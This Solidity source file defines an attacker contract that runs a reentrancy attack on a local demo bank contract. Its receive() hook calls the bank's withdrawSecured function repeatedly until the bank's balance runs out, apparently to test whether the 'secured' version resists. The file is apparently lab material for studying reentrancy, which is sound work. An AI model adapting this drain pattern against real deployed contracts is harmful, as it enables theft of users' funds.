// SPDX-License-identifier: MIT
pragma solidity ^0.8.30;

// Import the bank contract to interact with it
import "./SimpleBankVulnerable.sol"; 

contract Attacker {
    SimpleBankVulnerable public bank;
    
    // Amount to be withdrawn in each reentrancy call
    uint256 public constant REENTRANCY_WITHDRAW_AMOUNT = 1 ether; // Use 1 ether for the attack
    // Constructor must be payable to receive funds during deployment
    constructor(address _bankAddress) payable {
        bank = SimpleBankVulnerable(_bankAddress);
    }

    // Function to deposit funds into the bank
    function deposit() external payable {
        bank.deposit{value: msg.value}();
    }
    
    // Function to initiate the attack
    function attackSecured() external {
        // The Attacker calls the secured withdraw function for the first time
        bank.withdrawSecured(REENTRANCY_WITHDRAW_AMOUNT); 
    }

    // THE REENTRANCY HOOK
    // This function is triggered when SimpleBankVulnerable attempts to send ETH back.
   receive() external payable {
        // Check if the bank still has enough balance to continue the attack
    if (address(bank).balance >= REENTRANCY_WITHDRAW_AMOUNT) { 
       // Re-enter the withdraw function
        (bool success, ) = address(bank).call(
            abi.encodeWithSignature("withdrawSecured(uint256)", REENTRANCY_WITHDRAW_AMOUNT)
        );
        // Ensure the call was successful
        require(success, "Reentrant call failed");
    }
}

    // Function to check the Attacker contract's final balance
    function checkBalance() external view returns (uint256) {
        return address(this).balance;
    }
}